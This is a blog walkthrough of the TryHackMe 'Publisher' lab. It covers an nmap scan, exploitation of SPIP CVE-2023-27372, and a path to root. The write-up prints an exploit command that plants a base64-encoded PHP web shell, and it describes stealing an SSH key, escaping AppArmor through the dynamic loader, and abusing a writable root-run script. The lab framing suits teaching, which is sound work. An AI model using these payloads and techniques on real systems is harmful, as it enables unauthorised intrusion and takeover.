---
title: 'TryHackMe: Publisher'
author: AmcaQt
categories:
- TryHackMe
tags:
- web
- enumeration
- rce
- Boot2Root
- Directory Fuzzing
- Privilege Escalation
render_with_liquid: false
media_subpath: "/images/thm_publisher/"
image:
  path: room_card.png
date: 2024-09-10 00:00 +0000
---
![Tryhackme Room Link](room_image.PNG){: width="600" height="150" .shadow }
_<https://tryhackme.com/r/room/publisher>_

## Description

## Gain a Flag

### Enumaration

#### Nmap Scan

```Nmap Scan
┌──(root㉿amca)-[/home/amca]
└─# nmap -A -sC -sV -T5 10.10.125.110
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 03:54 EST
Warning: 10.10.125.110 giving up on port because retransmission cap hit (2).
Nmap scan report for publisher.thm (10.10.125.110)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Theres two open ports

- 22/SSH
- 80/HTTP

At `MACHINE_IP` we found a static page about `SPIP CMS`

![Web Page](page.png)

#### What is the user flag?

Using [Gobuster](https://www.kali.org/tools/gobuster/) we found one directory leads to another clue `/spip`, that shows installation of SPIP CMS

then using [WhatWeb]() will give us another clue, that shows version of SPIP is outdated 

![SPIP Version](1-version.PNG)
_<SPIP Version 4.2.0>_

Did some research online and found about the [exploit](https://github.com/nuts7/CVE-2023-27372) and PoC of the Vulnerabilities which is `Remote Code Execution`

Use the exploit that found on the github, and procced using this command : ~

```
┌──(root㉿amca)-[/home/amca/CVE-2023-27372]
└─# python3 CVE-2023-27372.py -u http://publisher.thm/spip/ -c 'echo PD89YCRfR0VUW2NtZF1gPz4= | base64 -d > shell.php'
```

> -u SPIP application base URL
> -c Command to Execute

now we got shell on the website to make our job easier
> `http://publisher.thm/spip/shell.php`

![](user.jpg)

### Examining the Filesystem

Notice theres `.ssh` directory inside the `/home/think`, I think maybe we can access using ssh key ?

Downloading the `id_rsa` key and testing it against the SSH service as the `think` user, we get a shell on the host.

```
ssh -i amca_key think@MACHINE_IP
think@publisher:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

nice one, using this much easier

### What is the root flag?

Looking for any binaries with a `SUID` bit set, we found `/usr/sbin/run_container`

Using `strings` i have found that it actually executes a bash script from the `/opt` folder

![](2.jpg)

We have write permissions on `/opt/run_container.sh`

```
think@publisher:~$ ls -la /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10 12:40 /opt/run_container.sh
But if we try to write to it, we get permission denied.
```

Using [Linpeas] to gain more info, that's when we found that `AppArmor` is enabled and our shell is not `bash` but `ash`, then we also see that there is an AppArmor profile for our current shell

![](3.PNG)

Now lets use kernel library to spawn an unconfined bash shell

``/ld-linux-x86–64.so.2 /bin/bash``

When this command is executed, it uses the specified `dynamic linker/loader (ld-linux-x86–64.so.2)` to load the required shared libraries and start the `/bin/bash` shell. This method of invoking the linker/loader directly with a binary is a way to execute a binary by explicitly specifying the dynamic linker/loader to use for that particular binary.

then run the file we found earlier `run_container.sh`, and we're `r00t`

![Root Flag](root.jpg)

## Conclusion

Im stressing a little bit, but it was fun, I learn a new way to gain root access.

## Happy Hacking

